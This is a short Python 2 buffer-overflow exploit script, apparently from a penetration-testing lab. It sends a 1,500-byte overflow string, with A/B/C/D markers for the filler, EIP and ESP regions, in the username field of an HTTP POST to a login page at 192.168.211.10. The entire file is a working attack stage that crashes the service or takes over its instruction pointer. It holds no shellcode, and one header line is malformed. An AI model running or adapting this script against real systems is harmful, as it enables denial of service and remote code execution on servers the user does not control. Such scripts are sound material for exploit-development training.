#!/usr/bin/python
import socket

try:
        print "\nSending Evil Buffer..."
        size = 800

        filler = "A" * 780
        EIP = "B" * 4
        Offset = "C" * 4
        ESP = "D" *  (1500 - len(filler) - len(EIP) - len(Offset))

        inputBuffer = filler + EIP + Offset + ESP

        content = "username=" + inputBuffer + "&password=A"

        buffer = "POST /login HTTP/1.1\r\n"
        buffer += "Host: 192.168.211.10\r\n"
        buffer += "Mozilla/5.0 (X11; Linux i686; rv:52.0) Gecko/20100101 Firefox/52.0\r\n"
        buffer += "Accept-Language: en-US,en;q=0.5\r\n"
        buffer += "Referer: http://192.168.211.10/login\r\n"
        buffer += "Connection: close\r\n"
        buffer += "Content-Type: application/x-www-form-urlencoded\r\n"
        buffer += "Content-Length: "+str(len(content))+"\r\n"
        buffer += "\r\n"
        buffer += content

        s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)
        s.connect(("192.168.211.10", 80))
        s.send(buffer)

        s.close()

        print "\nDone"

except:
        print "\nCould not connect."
